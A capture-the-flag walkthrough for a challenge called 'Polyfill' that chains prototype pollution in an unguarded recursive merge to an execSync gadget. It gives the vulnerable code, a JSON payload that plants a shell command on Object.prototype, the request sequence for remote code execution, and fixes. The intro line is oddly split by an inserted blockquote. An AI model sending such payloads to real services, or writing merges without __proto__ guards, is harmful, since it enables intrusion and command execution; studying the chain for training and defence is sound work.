# Walkthrough — Polyfill  (SPOILERS)

**Chain:** prototype pollution (unsafe recursive merge) → command gadget (`execSync` reading an

> Two flags — **FLAG1 (access):** pollute `role=admin`; `/account` returns it. **FLAG2 (proof):** pollute the command gadget for RCE (`/proof.txt`).
inherited property) → RCE → flag.

## 1. Prototype pollution
`POST /config` deep-merges your JSON into `config`:
```js
function merge(target, source) {
  for (const key in source) {
    const val = source[key];
    if (val && typeof val === 'object') {
      if (typeof target[key] !== 'object' || target[key] === null) target[key] = {};
      merge(target[key], val);     // follows key === "__proto__"
    } else {
      target[key] = val;
    }
  }
}
```
There's no guard for `__proto__`. Sending `{"__proto__":{"healthCmd":"..."}}` makes
`target["__proto__"]` resolve to `Object.prototype`, and the merge writes `healthCmd` onto it. Now every
object in the process inherits `healthCmd`.

## 2. The gadget
Pollution alone is inert; you need a **sink that reads the polluted property**. `GET /health`:
```js
const opts = {};
const cmd = opts.healthCmd || 'echo healthy';
execSync(cmd);
```
`opts` has no *own* `healthCmd`, so the lookup walks the prototype chain and finds the one we planted.
`execSync` runs it.

## 3. RCE
```
POST /config   {"__proto__":{"healthCmd":"cat /proof.txt"}}
GET  /health   -> FLAG2{polluted_gadget_ran_my_command}
```
The reference exploit also prints `/health` *before* pollution (`healthy`) to prove the control.

## Fixes
- Guard merges: reject keys `__proto__`, `constructor`, `prototype`; or use `Object.create(null)`,
  `Map`, or a vetted library and `Object.freeze(Object.prototype)`.
- Don't feed config-derived strings into `exec`/`execSync`. Use argument arrays and an allowlist.

## Takeaways
- Prototype pollution is a two-part bug: the **write** (unsafe merge/clone) and the **gadget** (code
  that later reads an attacker-influenced property). Finding the gadget is the real work — read for
  property lookups on fresh objects that flow into dangerous sinks.